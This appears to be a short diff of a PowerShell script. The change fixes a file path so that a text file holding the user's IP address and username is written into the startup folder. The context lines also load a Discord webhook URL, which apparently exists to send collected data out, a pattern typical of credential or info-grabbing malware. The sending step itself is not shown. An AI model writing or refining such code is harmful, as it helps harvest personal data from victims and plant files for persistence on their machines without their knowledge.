@@ -17,7 +17,7 @@ $DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile
 
 # Create a text file in the user's startup folder
 $TextContent = "$IPAddress`n$Username"
-$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory$Username.icu"
+$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
 $TextContent | Out-File -FilePath $TextFile
 
 # Define a message (commented out for now)
